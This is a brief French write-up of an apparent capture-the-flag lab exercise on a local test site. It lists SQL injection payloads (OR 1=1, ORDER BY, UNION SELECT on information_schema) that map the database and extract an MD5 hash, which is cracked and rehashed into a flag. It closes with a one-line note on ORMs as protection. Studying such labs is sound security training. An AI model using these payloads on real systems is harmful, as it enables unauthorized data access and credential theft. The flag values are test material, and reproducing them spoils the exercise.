# SQL INJECTION

http://192.168.1.26/?page=searchimg

1. Hmmm ...

    1 OR 1=1 
    1 ORDER BY 2
    1 ORDER BY 3
    1 UNION SELECT database(), user()

2. Intéressant ...

    1 OR 1=1 UNION SELECT null, table_name FROM information_schema.tables  
    1 OR 1=1 UNION SELECT null, column_name FROM information_schema.columns
    1 or 1=1 UNION select table_name, column_name FROM information_schema.columns

    Avec ces injections on peut structurer la DB : 

    users       : user_id, first_name, last_name, town, country, planet, Commentaire, countersign
    guestbook   : id_comment, comment, name
    list_images : id, url, title, comment
    vote_dbs    : id_vote, vote, nb_vote, subject

3. Continuons ...

    1 or 1=1 UNION SELECT title, comment FROM list_images

Et voilà ! On obtient un hash MD5 : 1928e8083cf461a51303633093573c46
https://md5decrypt.net/#answer => MD5 Decrypt => albatroz => SHA256 Encrypt => f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188


# PROTECTION

CF. Faille "sql-users" ... Les ORM ! (Object-Relational Mapping)